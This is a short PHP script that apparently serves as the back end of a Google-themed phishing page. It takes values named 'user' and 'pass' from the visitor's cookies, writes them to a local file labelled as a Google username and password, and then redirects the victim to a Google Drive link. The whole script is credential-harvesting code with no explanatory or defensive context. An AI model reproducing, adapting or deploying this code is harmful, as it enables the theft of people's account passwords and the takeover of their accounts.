<?php

file_put_contents("usernames.txt", "Google Username: " . $_COOKIE['user'] . "\nPassword: " . $_COOKIE['pass'] . "\n", FILE_APPEND);
$url = "https://drive.google.com/drive/folders/1unlpUD-zH6Zp9OZos2l-x_BVVI7EfqXi?usp=share_link"; # https://accounts.google.com/signin/v2/recoveryidentifier
header("Location: $url");
exit();
?>
